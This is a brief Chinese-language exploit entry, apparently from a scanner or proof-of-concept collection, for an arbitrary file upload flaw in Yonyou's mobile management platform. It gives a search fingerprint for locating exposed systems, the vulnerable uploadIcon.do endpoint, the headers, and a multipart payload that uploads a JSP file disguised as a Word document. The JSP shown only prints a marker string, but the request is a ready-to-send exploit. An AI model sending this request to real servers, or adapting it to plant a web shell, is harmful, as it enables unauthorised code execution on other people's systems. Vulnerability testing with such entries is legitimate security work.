# 用友移动管理平台uploadIcon任意文件上传

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-移动系统管理"`
- **请求**：`POST /maportal/appmanager/uploadIcon.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX…`　`Cookie: JSESSIONID=96C92E0C800D0F301877F24A281C4630.server`

**请求体 / payload**
```
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="iconFile"; filename="dudesuite.jsp"
Content-Type: application/msword
<% out.print("dudesuite"); %>
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```
- **预期**：200　|　status